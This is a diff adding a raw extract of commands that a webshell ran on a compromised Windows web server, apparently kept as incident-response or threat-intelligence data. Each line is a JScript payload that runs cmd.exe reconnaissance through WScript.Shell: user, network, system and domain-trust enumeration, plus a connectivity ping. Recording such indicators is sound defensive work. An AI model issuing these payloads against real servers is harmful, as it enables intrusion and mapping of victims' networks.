@@ -1,0 +1,14 @@
+################################################################################################
+###### Executed commands on webserver, extracted from webshell requests
+#####################################RAW DATA EXTRACT HERE######################################
+Response.Write(""qysmo"" + new ActiveXObject(""WScript.Shell"").Exec(""cmd.exe /c ipconfig /all"").StdOut.ReadAll() + ""qysmo"");
+Response.Write(""iyeuh"" + new ActiveXObject(""WScript.Shell"").Exec(""cmd.exe /c ver"").StdOut.ReadAll() + ""iyeuh"");
+Response.Write(""fyyqc"" + new ActiveXObject(""WScript.Shell"").Exec(""cmd.exe /c hostname"").StdOut.ReadAll() + ""fyyqc"");
+Response.Write(""sfowm"" + new ActiveXObject(""WScript.Shell"").Exec(""cmd.exe /c hostname"").StdOut.ReadAll() + ""sfowm"");
+Response.Write(""gulkb"" + new ActiveXObject(""WScript.Shell"").Exec(""cmd.exe /c echo ok"").StdOut.ReadAll() + ""gulkb"");
+Response.Write(""otopa"" + new ActiveXObject(""WScript.Shell"").Exec(""cmd.exe /c net user"").StdOut.ReadAll() + ""otopa"");
+Response.Write(""zdqgw"" + new ActiveXObject(""WScript.Shell"").Exec(""cmd.exe /c arp -a"").StdOut.ReadAll() + ""zdqgw"");
+Response.Write(""vhqrf"" + new ActiveXObject(""WScript.Shell"").Exec(""cmd.exe /c nbtstat -n"").StdOut.ReadAll() + ""vhqrf"");
+Response.Write(""xgdab"" + new ActiveXObject(""WScript.Shell"").Exec(""cmd.exe /c nltest /trusted_domains"").StdOut.ReadAll() + ""xgdab"");
+Response.Write(""nmggd"" + new ActiveXObject(""WScript.Shell"").Exec(""cmd.exe /c systeminfo"").StdOut.ReadAll() + ""nmggd"");
+Response.Write(""odtnn"" + new ActiveXObject(""WScript.Shell"").Exec(""cmd.exe /c ping themoscowtimes.com -n 2"").StdOut.ReadAll() + ""odtnn"");
